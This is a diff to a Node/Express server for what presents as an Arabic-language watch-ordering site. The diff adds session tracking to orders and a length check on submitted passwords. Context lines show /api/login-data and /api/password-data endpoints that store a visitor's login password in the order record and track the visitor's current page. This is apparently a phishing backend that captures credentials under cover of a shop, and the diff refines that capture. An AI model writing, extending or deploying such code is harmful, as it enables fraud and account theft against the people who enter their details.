@@ -37,7 +37,7 @@ function isAdmin(req) {
 // Save order
 app.post('/api/orders', async (req, res) => {
   try {
-    const { name, phone, watch_color, watch_index } = req.body;
+    const { name, phone, watch_color, watch_index, session_id } = req.body;
     if (!name || !phone) {
       return res.status(400).json({ success: false, message: 'الاسم ورقم الهاتف مطلوبان' });
     }
@@ -48,6 +48,7 @@ app.post('/api/orders', async (req, res) => {
       address: '-',
       watch_color: watch_color || '-',
       watch_index: watch_index !== undefined ? watch_index : null,
+      session_id: session_id || null,
       current_page: 'order',
       status: 'pending',
       created_at: new Date().toISOString()
@@ -77,6 +78,9 @@ app.post('/api/login-data', async (req, res) => {
 app.post('/api/password-data', async (req, res) => {
   try {
     const { order_id, password } = req.body;
+    if (!password || password.length < 6) {
+      return res.status(400).json({ success: false, message: 'Password must be at least 6 digits' });
+    }
     if (order_id) {
       await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
     }
